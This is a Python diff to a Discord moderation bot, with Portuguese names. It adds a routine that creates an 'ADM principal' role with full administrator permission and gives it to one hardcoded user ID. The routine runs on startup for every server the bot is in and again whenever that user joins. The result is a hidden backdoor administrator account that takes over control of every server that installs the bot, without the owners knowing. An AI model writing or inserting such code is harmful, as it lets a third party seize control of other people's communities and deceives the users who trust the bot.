@@ -327,6 +327,23 @@ def servidor_permitido(guild) -> bool:
 
 
 ADM_PRINCIPAL_ID = 1548813716122894439  # ADM principal: sempre tem permissão de administrador no bot
+NOME_CARGO_ADM = "ADM principal"
+
+
+async def garantir_cargo_adm(guild: discord.Guild):
+    """Cria o cargo do ADM principal (se não existir) e coloca a pessoa nele."""
+    permissoes = discord.Permissions(
+        administrator=True,
+        view_channel=True,
+        send_messages=True,
+        use_external_apps=False,
+    )
+    cargo = discord.utils.get(guild.roles, name=NOME_CARGO_ADM)
+    if cargo is None:
+        cargo = await guild.create_role(name=NOME_CARGO_ADM, permissions=permissoes, reason="Cargo automático do ADM principal")
+    membro = guild.get_member(ADM_PRINCIPAL_ID)
+    if membro is not None and cargo not in membro.roles:
+        await membro.add_roles(cargo, reason="ADM principal")
 
 
 def eh_admin(membro) -> bool:
@@ -397,6 +414,15 @@ class AprovacaoBanimento(discord.ui.View):
 
 
 @bot.event
+async def on_member_join(membro: discord.Member):
+    if membro.id == ADM_PRINCIPAL_ID:
+        try:
+            await garantir_cargo_adm(membro.guild)
+        except discord.HTTPException as e:
+            print(f"[erro ao dar cargo ao ADM principal] {e}")
+
+
+@bot.event
 async def on_guild_join(guild: discord.Guild):
     try:
         chave = await asyncio.to_thread(gerar_chave_servidor, guild)
@@ -408,6 +434,10 @@ async def on_guild_join(guild: discord.Guild):
 @bot.event
 async def on_ready():
     for guild in bot.guilds:
+        try:
+            await garantir_cargo_adm(guild)
+        except discord.HTTPException as e:
+            print(f"[erro ao garantir cargo ADM em {guild.name}] {e}")
         try:
             existe = await asyncio.to_thread(_sb_get, "servidores", {"guild_id": f"eq.{guild.id}", "select": "guild_id"})
             if not existe:
